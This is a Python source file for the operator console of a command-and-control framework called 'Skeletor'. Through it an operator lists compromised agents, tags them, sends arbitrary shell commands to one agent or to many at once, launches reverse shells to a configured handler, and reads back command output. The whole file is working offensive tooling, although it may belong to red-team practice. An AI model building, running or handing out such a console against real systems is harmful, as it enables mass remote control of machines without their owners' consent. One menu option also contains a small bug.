#!/usr/bin/python3
 
from pathlib import Path
from dotenv import load_dotenv
import os
import requests

load_dotenv()
ANSI_GREEN = "\033[0;32m"
ANSI_RED = "\033[0;31m"
ANSI_RESET = "\033[0m"
CURRENT_PATH = Path(__file__).resolve().parent
LOGO_PATH = CURRENT_PATH / "resources" / "logo.txt"
SKELETOR_IP = os.getenv("SKELETOR_IP", "127.0.0.1")
SKELETOR_PORT = os.getenv("SKELETOR_PORT", "80")
SKELETOR_SHELL_HANDLER_ADDR = os.getenv("SKELETOR_SHELL_HANDLER_ADDR","127.0.0.1:9000")
SKELETOR_AUTH_KEY=os.getenv("SKELETOR_AUTH_KEY","")
CUSTOM_HEADERS = {}
if SKELETOR_AUTH_KEY.strip() != "":
    CUSTOM_HEADERS["X-Skeletor-Auth"] = SKELETOR_AUTH_KEY
CURRENT_TARGETS=[]

def init():
    print("Initializing Skeletor Console..."+"\n"*3)
    if LOGO_PATH.exists():
        print(LOGO_PATH.read_text(encoding='utf-8'),end="\n"*4)

def cmd_help():
    menu = {
        "help": "Show this list of commands",
        "agents": "View Skeletor Agents",
        "netinfo": "View Skeletor Server Networking Config",
        "agentinfo": "View information about a specific agent",
        "command": "Issue a command to an agent",
        "shell": "Launch an interactive shell",
        "multiexec": "Execute a command on multiple targets",
        "results": "Lookup results from agents",
        "addtag": "Add tags for agent",
        "rmtag": "Remove tags for agent",
        "quit": "Exit Skeletor Console"
    }
    print("\nCommands:\n")
    for command, description in menu.items():
        print(f"  {command:12}   {description}")
    print("\n")

def cmd_exit():
    userin = input("Are you sure you want to exit the console? ").strip().lower()
    if userin in ["yes","y"]:
        return True
    else: 
        return False

def cmd_agents():
    try:
        agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents",
        timeout=5,headers=CUSTOM_HEADERS).json()
        output_header = f"\n{'AGENT ID':<16} {'STATUS':<12} {'CALLBACKS':<12} {'LAST SEEN':<22} {'TAGS'}"
        print(output_header)
        print("-" * len(output_header))
        for agent in agents:
            status = agent['status']
            color = ANSI_RED if status == "inactive" else ANSI_GREEN
            status_formatted = f"{color}{status:<12}{ANSI_RESET}"
            tag_str = ", ".join(agent.get('tags', []))
            print(f"{agent['agent_id']:<16} "
                  f"{status_formatted:<12} "
                  f"{agent['callbacks']:<12} "
                  f"{agent['last_seen']:<22} "
                  f"{tag_str}")
        print("\n")
    except Exception as e:
        print(f"\n{e}\n")

def cmd_netinfo():
    print(f"\nSkeletor Server Address: {SKELETOR_IP}:{SKELETOR_PORT}")
    print(f"Skeletor Shell Handler Address: {SKELETOR_SHELL_HANDLER_ADDR}\n\n")

def cmd_issuecmd():
    agent_id = input("Enter agent ID of target: ").strip()
    command = input("Command to execute: ").strip()
    try:
        data = {'agent_id': agent_id, 'action': 'command', 'input': command}
        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
        print(f"Task created for {agent_id}\n")
    except Exception as e:
        print(f"\n{e}\n")

def cmd_multiexec():
    print("1. View Current Targets")
    print("2. Add Target")
    print("3. Add Targets By Tag")
    print("4. Remove Target")
    print("5. Clear Targets")
    print("6. Issue Command to All Targets")
    print("7. Exit multiexec mode")
    while True:
        try:
            userin = input("\n> ").strip().split()
            match userin:
                case ["1"] | ["view"]:
                    for agent in CURRENT_TARGETS: print(agent)
                case ["add", target_id]:
                    CURRENT_TARGETS.append(target_id)
                case ["2"]:
                    newtarget = input("New Target: ").strip()
                    CURRENT_TARGETS.append(newtarget)
                case ["3"]:
                    pass
                    tag = input("Tag to target: ").strip()
                    tag_data = {"tag": tag}
                    resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged", json=tag_data,headers=CUSTOM_HEADERS).json()
                    tagged_agents = resp['agents']
                    for agent in tagged_agents:
                        if agent not in CURRENT_TARGETS:
                            CURRENT_TARGETS.append(agent)
                    print(f"Agents added to targets: {', '.join(tagged_agents)}")
                case ["remove", target_id]:
                    if target_id in CURRENT_TARGETS: CURRENT_TARGETS.remove(target_id)
                case ["4"]:
                    toremove = input("Target to remove: ").strip()
                    if target_id in CURRENT_TARGETS: CURRENT_TARGETS.remove(toremove)
                case ["5"] | ["clear"]:
                    CURRENT_TARGETS.clear()
                case ["6"]:
                    command = input("\nCommand to execute: ").strip()
                    print()
                    for agent_id in CURRENT_TARGETS:
                        data = {'agent_id': agent_id, 'action': 'command', 'input': command}
                        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
                        print(f"Task created for {agent_id}")
                    print("\n")
                case ["7"] | ["exit"] | ["quit"] | ["q"]:
                    break
                case _:
                    print("Unrecognized option")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"\n{e}\n")

def cmd_shell():
    print(f"\nConfigured shell handler address is {SKELETOR_SHELL_HANDLER_ADDR}\n")
    target = input("Agent ID to launch shell on: ").strip()
    try:
        data = {'agent_id': target, 'action': 'shell', 'input': SKELETOR_SHELL_HANDLER_ADDR}
        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
        print(f"Shell task created for {target}, check the shell handler\n")
    except Exception as e:
            print(f"\n{e}\n")


def cmd_result():
    while True:
        try:
            agentid = input("Agent ID to retrieve results from: ").strip()
            if agentid == "":
                continue
            if agentid in ["exit","back","q","quit"]:
                break
            data = {"agent_id": agentid}
            result = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result", json=data,headers=CUSTOM_HEADERS).json()
            print("\n" + "Agent: " + agentid + "\n" + "Command: " + result.get('command') + "\n" + "Result: " + result.get('result') + "\n")
        except KeyboardInterrupt:
            break
        except Exception as e:
                print(f"\n{e}\n")

def cmd_agentinfo():
    try:
        agentid = input("\nAgent ID: ").strip()
        print("\nAgent ID:",agentid)
        data = {"agent_id":agentid}
        agent_info = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data,headers=CUSTOM_HEADERS).json()
        print("Status:",agent_info["status"])
        print("Callbacks:",agent_info["callbacks"])
        print("Last Seen:",agent_info["last_seen"])
        print("Last Command:",agent_info["last_command"])
        print("Last Result:",agent_info["last_result"],"\n")
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"\n{e}\n")

def cmd_addtag():
    try:
        agentid = input("Agent ID: ").strip()
        newtags = input("Tags to add (csv format): ").strip()
        data = {"agent_id": agentid,"tags": newtags}
        response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data,headers=CUSTOM_HEADERS).json()
        print(f"\nAdded tags for {agentid}: {', '.join(response['added_tags']) if response['added_tags'] else 'None'}")
        print(f"All tags for {agentid}: {', '.join(response['all_tags'])}\n")
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"\n{e}\n")

def cmd_removetag():
    try:
        agentid = input("Agent ID: ").strip()
        badtags = input("Tags to remove (csv format): ").strip()
        data = {"agent_id": agentid,"tags": badtags}
        response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/remove-tag", json=data,headers=CUSTOM_HEADERS).json()
        print(f"\nRemoved tags for {agentid}: {', '.join(response['removed_tags']) if response['removed_tags'] else 'None'}")
        print(f"All tags for {agentid}: {', '.join(response['all_tags'])}\n")
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"\n{e}\n")
     

def main():
    commands = {
    "agents": cmd_agents,
    "netinfo": cmd_netinfo,
    "command": cmd_issuecmd,
    "cmd": cmd_issuecmd,
    "multiexec": cmd_multiexec,
    "shell": cmd_shell,
    "agentinfo": cmd_agentinfo,
    "results": cmd_result,
    "result": cmd_result,
    "addtag": cmd_addtag,
    "rmtag": cmd_removetag,
    "removetag": cmd_removetag,
    "help": cmd_help,
    "h": cmd_help,
    }
    init()
    active = True
    while active:
        try:
            userin = input("Skeletor > ").strip().lower()
            if not userin:
                continue  
            elif userin in ["exit","quit","q"]:
                if cmd_exit():
                    active = False
            elif userin in commands:
                commands[userin]() 
            else:
                print(f"Unknown command: '{userin}'. Type 'help' for list.")
        except KeyboardInterrupt:
            print()
            if cmd_exit():
                active = False
        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()